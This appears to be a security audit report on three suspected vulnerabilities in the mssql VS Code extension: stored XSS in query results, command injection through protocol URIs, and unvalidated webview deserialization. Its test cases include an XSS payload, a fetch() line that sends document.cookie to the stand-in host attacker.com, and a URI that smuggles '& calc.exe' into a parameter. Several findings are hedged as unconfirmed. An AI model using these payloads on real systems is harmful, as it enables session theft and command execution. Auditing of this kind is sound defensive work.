## Combined Vulnerability List for mssql VSCode Extension

### - Vulnerability Name: Stored Cross-Site Scripting (XSS) in Query Results

- **Description:**
    An attacker can craft a malicious SQL query that, when executed by a user of the mssql extension, injects JavaScript code into the query results view. This injected code executes when the user views the results, potentially leading to information disclosure or other malicious actions within the VSCode extension's context. This vulnerability arises because the extension does not properly sanitize or escape data received from SQL query results before rendering it in the webview. When the extension renders the results of a malicious SQL query in the webview, the injected JavaScript code is executed.

- **Impact:**
    Successful exploitation allows arbitrary JavaScript code execution within the VSCode environment upon viewing query results. This can lead to:
    - Stealing sensitive information accessible to the extension (e.g., connection profiles, tokens, cookies).
    - Performing actions on behalf of the user within VSCode.
    - Manipulating the webview UI.
    - Redirecting the user to malicious websites.
    - Potentially gaining further access to the user's system through VSCode vulnerabilities, depending on the privileges of the webview context and any exposed APIs.

- **Vulnerability Rank:** High

- **Currently Implemented Mitigations:**
    No specific sanitization or escaping of query results is mentioned in the provided files related to webview rendering or message handling. The project uses `ejs` templating for rendering SQL output in `src/controllers/sqlOutput.ejs`. Verification is still needed to confirm if ejs is configured for automatic HTML escaping and if this configuration is correctly applied during build. Reviewing `gulpfile.js` and build configurations is still necessary to confirm HTML escaping during the build process. No explicit sanitization or encoding is apparent in the provided `queryRunner.ts` file, which is responsible for handling query results. The newly provided files, including `sqlOutputContentProvider.ts`, files in `/code/src/models/`, and test files in `/code/test/unit/`, do not include any explicit mitigation for XSS in query results or execution plan views. There is no evidence of output sanitization in `sqlOutputContentProvider.ts` before data is sent to the webview. Analysis of the newly provided test files (`queryRunner.test.ts`, `reactWebviewBaseController.test.ts`, `webviewPanelController.test.ts`, `stubs.ts`) does not reveal any implemented mitigations for XSS. These test files primarily focus on functional testing of different components and do not include security-specific tests or sanitization implementations.

- **Missing Mitigations:**
    - Implement robust output sanitization and encoding of query results before rendering in the webview, specifically HTML escaping to prevent XSS. This sanitization should be implemented within `sqlOutputContentProvider.ts` before emitting data to the webview or directly within the rendering templates/components.
    - Utilize VS Code's Content Security Policy (CSP) for webviews to restrict the capabilities of the webview and prevent execution of inline scripts and styles from untrusted sources.
    - Review and hardening of `angular2-slickgrid` configuration to ensure it's not vulnerable to XSS when rendering user-controlled data in `/code/src/views/htmlcontent/src/js/components/app.component.ts`.
    - Investigation and sanitization of data rendering in execution plan views, specifically in `executionPlanView.ts` and related React components in `/code/src/reactviews/pages/ExecutionPlan/`, to prevent XSS in execution plan graphs and node details.

- **Preconditions:**
    - The attacker needs to influence the SQL query executed by the victim or be able to execute SQL queries against a database connected to by the VS Code mssql extension. This can be done through social engineering, compromising query-generating systems, providing a crafted `.sql` file, or by users running queries from untrusted sources.
    - The user must execute the malicious SQL query using the mssql extension and view the results in the VSCode UI.
    - The `mssql.enableRichExperiences` setting must be enabled to utilize the new query results pane.
    - For execution plan XSS (if applicable), the user must view the execution plan results pane.

- **Source Code Analysis:**
    1. **Rendering Points:** `src/controllers/sqlOutput.ejs` remains a confirmed rendering point for tabular SQL query results. React components in `/code/src/reactviews/pages/ExecutionPlan/` are used for rendering execution plans, particularly `executionPlanView.ts`. The file `/code/src/views/htmlcontent/src/js/components/app.component.ts` using `angular2-slickgrid` is also a rendering point.
    2. **Data Flow:** `queryRunner.ts` (File: `/code/src/controllers/queryRunner.ts`) handles query execution and emits data to the webview through events. `sqlOutputContentProvider.ts` (File: `/code/src/models/sqlOutputContentProvider.ts`) manages the `QueryRunner` and webview communication. The `createQueryRunner` method in `SqlOutputContentProvider` sets up event listeners on the `QueryRunner`'s `eventEmitter`. The `resultSet` event handler in `createQueryRunner` is responsible for sending result set data to the webview:

    ```typescript
    // File: /code/src/models/sqlOutputContentProvider.ts
    queryRunner.eventEmitter.on(
        "resultSet",
        async (resultSet: ResultSetSummary) => {
            if (this.shouldUseOldResultPane) {
                this._panels
                    .get(uri)
                    .proxy.sendEvent("resultSet", resultSet); // Potential XSS sink - data passed to webview without sanitization for sqlOutput.ejs
            } else {
                // ... (New Query Result Pane Logic - potentially vulnerable as well) ...
            }
        },
    );
    ```

    The code in `sqlOutputContentProvider.ts` does not show any sanitization of `resultSet` before it's passed to the webview via `proxy.sendEvent("resultSet", resultSet)` for the old result pane (using `sqlOutput.ejs`) or in the new query result pane logic. This confirms that data from SQL queries is directly sent to the webview without sanitization, creating a potential XSS vulnerability.
    3. **Template and Component Inspection:**  `sqlOutput.ejs` (from previous analysis) lacks explicit HTML escaping. The React components in `/code/src/reactviews/pages/ExecutionPlan/` and `angular2-slickgrid` component in `/code/src/views/htmlcontent/src/js/components/app.component.ts` also need to be reviewed for proper sanitization of data properties before rendering.
    4. **Configuration Verification:**  The provided files do not contain explicit configuration for HTML escaping in `ejs` or explicit sanitization functions in the data flow. Build configurations and component rendering logic still need to be reviewed to confirm HTML escaping and sanitization.
    5. **`queryRunner.ts` and `sqlOutputContentProvider.ts`:** These files are key areas of concern as they handle query execution, result processing, and content provision to the webview. The data flow from `QueryRunner` to webviews still needs to be carefully examined for sanitization.

    ```
    SQL Query (Malicious Payload) --> QueryRunner.ts (handleMessage, handleQueryComplete etc.) --> eventEmitter.emit('message', ...) --> Webview (Unsanitized rendering) --> XSS Vulnerability
    ```

- **Security Test Case:**
    1. **Malicious SQL Query for Query Results:** Craft a SQL query to return JavaScript code as data: `SELECT '<img src="x" onerror="alert(\'XSS in Query Results\')">';`
    2. **Execute Query:** Run this query against a SQL Server instance using the mssql extension. Ensure `mssql.enableRichExperiences` is enabled.
    3. **View Results:** Observe the query results pane in VSCode.
    4. **Verify XSS Execution (Query Results):** Check if the injected JavaScript code executes in the webview. A successful XSS will manifest as an alert box displaying "XSS in Query Results".
    5. **Malicious SQL Query for Execution Plan (if applicable):** Craft a SQL query that includes malicious data within elements that might be displayed in the execution plan graph or node tooltips. Example: `SELECT 1 AS [Operator Type], '<img src="x" onerror="alert(\'XSS in Execution Plan\')">' AS [Estimated CPU Cost] FOR XML PATH (''), ROOT('ExecutionPlan');`
    6. **Enable Actual Execution Plan:** Enable "Actual Execution Plan" for the query.
    7. **Execute Query with Execution Plan:** Run the crafted query with Actual Execution Plan enabled.
    8. **View Execution Plan:** Open and inspect the Execution Plan pane in VSCode.
    9. **Verify XSS Execution (Execution Plan):** Check if the injected JavaScript code executes in the execution plan webview, specifically when interacting with nodes or viewing tooltips. A successful XSS will manifest as an alert box displaying "XSS in Execution Plan".
    10. **Inspect HTML Source (Optional):** If VSCode allows, inspect the webview's HTML source for both query results and execution plan panes to confirm the presence of unencoded malicious JavaScript code.
    11. **Advanced Test - Data Exfiltration:** Modify the query to:
    ```sql
    SELECT '<img src=x onerror="fetch(\'https://attacker.com/log?data=\'+document.cookie)">';
    ```
    12. **Set up HTTP Listener:** Set up a simple HTTP listener on `attacker.com` (e.g., using `netcat` or `python -m http.server`).
    13. **Execute Query and Check Listener:** Execute the query and check if the listener receives a request containing document cookies or other sensitive data that the webview might have access to.

### - Vulnerability Name: Potential Command Injection in mssql Protocol Handler URI Parsing

- **Description:**
    The `mssqlProtocolHandler.ts` file is responsible for handling custom `vscode-mssql` protocol URIs. If the parsing of URI parameters is not properly sanitized, especially when these parameters are used to construct or execute commands within the extension or SQL Tools Service, it could lead to command injection vulnerabilities. An attacker could craft a malicious URI that, when opened (e.g., by clicking a link in a markdown file or through social engineering), could execute arbitrary commands.

- **Impact:**
    Command injection could allow an attacker to execute arbitrary commands on the user's machine with the privileges of the VS Code process. This could range from data exfiltration and malware installation to complete system compromise.

- **Vulnerability Rank:** High

- **Currently Implemented Mitigations:**
    No specific input sanitization or validation is evident in the provided code snippet for `mssqlProtocolHandler.ts` from previous files. The new test files do not introduce any mitigations for this vulnerability and do not include tests for URI handling.

- **Missing Mitigations:**
    - Implement strict input validation and sanitization for all parameters extracted from the `vscode-mssql` protocol URIs.
    - Avoid using URI parameters directly to construct or execute system commands or SQL queries without proper encoding and validation.
    - Use parameterized queries or stored procedures to prevent SQL injection if URI parameters are used in database queries.

- **Preconditions:**
    - An attacker needs to get a user to click on a specially crafted `vscode-mssql` URI. This could be through social engineering, embedding the link in a document, or exploiting other vulnerabilities to automatically open such a URI.

- **Source Code Analysis:**
    - Further investigation into `mssqlProtocolHandler.ts` is still needed to determine the extent of URI parameter handling and potential command injection risks. The test files reviewed do not contain explicit URI handling code to confirm or deny this vulnerability directly. The new test files (`/code/test/unit`) do not provide additional information to mitigate or confirm this vulnerability.

- **Security Test Case:**
    1. Craft a malicious `vscode-mssql` URI that attempts to inject a command, for example by manipulating the `server` parameter to include shell commands. An example malicious URI might look like:
    ```
    vscode://ms-mssql.mssql/connect?server=localhost%20%26%20calc.exe&database=testdb&user=sa&authenticationType=SqlLogin
    ```
    (Note: `%20%26%20calc.exe` is URL-encoded for ` & calc.exe`, attempting to append a command after the server name)
    2. Embed this URI in a markdown file or simulate a user clicking on this link within VS Code (e.g., by manually triggering the URI handler).
    3. Observe if the `calc.exe` (or equivalent command for the OS) is executed. If it does, this confirms a command injection vulnerability.
    4. Monitor system logs and processes to detect any unexpected command executions when clicking on or triggering the crafted URI.

### - Vulnerability Name: Unvalidated Deserialization in Webview Communication

- **Description:**
    If the communication protocol between the webview and the extension backend (defined in `src/protocol.ts`) involves deserializing objects received from the webview without proper validation, it could be vulnerable to deserialization attacks. An attacker could craft malicious messages from the webview that, when deserialized by the extension, could lead to arbitrary code execution or denial of service. This is particularly concerning if the extension uses a deserialization method that is known to be insecure (like `eval` or certain JSON deserialization methods with unsafe settings) or if it deserializes complex objects without schema validation.

- **Impact:**
    Unvalidated deserialization can lead to arbitrary code execution on the host machine, allowing the attacker to completely compromise the user's system. Depending on the context and privileges of the extension, this could have severe consequences.

- **Vulnerability Rank:** Critical

- **Currently Implemented Mitigations:**
    The provided code snippets from previous files do not show any explicit deserialization logic in `src/protocol.ts`, but the `MessageProxy` class and `onReceive` method handle message parsing (`JSON.parse(val)`). If the handlers process complex objects from these parsed messages without validation, it could be vulnerable. The new test files, including `reactWebviewBaseController.test.ts`, test the functionality of the `ReactWebviewBaseController` and its message handling, but they do not include tests that specifically target deserialization vulnerabilities or demonstrate any implemented mitigations.

- **Missing Mitigations:**
    - Avoid deserializing complex objects directly from webview messages if possible. Prefer simple data types and validate all inputs.
    - If deserialization of complex objects is necessary, implement strict schema validation to ensure that the received data conforms to the expected structure and types.
    - Use secure deserialization methods and libraries that are less prone to vulnerabilities.
    - Implement input sanitization and validation even after deserialization to prevent further exploitation.

- **Preconditions:**
    - The attacker needs to be able to send messages to the webview's message handler. This is generally possible for any extension webview as they are designed to receive messages from the webview context.

- **Source Code Analysis:**
    - `src/services` files: These service files and `src/controllers/sharedExecutionPlanUtils.ts` still highlight potential communication pathways where deserialization vulnerabilities could exist if webview messages are processed by these services without validation. The new test files (`/code/test/unit`) do not show changes to these services or controllers that would mitigate this vulnerability.
    - The code in `QueryRunner.ts` and service files reinforces the architecture where messages are passed between the extension backend and potentially webviews. The need to verify deserialization in this communication path and implement proper validation remains critical.

- **Security Test Case:**
    1. Develop a malicious VS Code extension that can send messages to the mssql extension's webview (you would need to know the webview ID, which might be predictable or discoverable).
    2. Craft a malicious JSON payload that exploits a known deserialization vulnerability (if any exists in the JavaScript runtime or libraries used by the extension's backend - Node.js). This payload would be designed to execute arbitrary code when deserialized.
    3. Send this malicious JSON payload as a message to the mssql extension's webview using the malicious extension.
    4. Monitor for signs of arbitrary code execution on the VS Code host machine. This could be checked by observing unexpected process creation, file system modifications, or network connections initiated by the VS Code process.
    5. If successful, the test would demonstrate that unvalidated deserialization in webview communication can be exploited to achieve code execution.
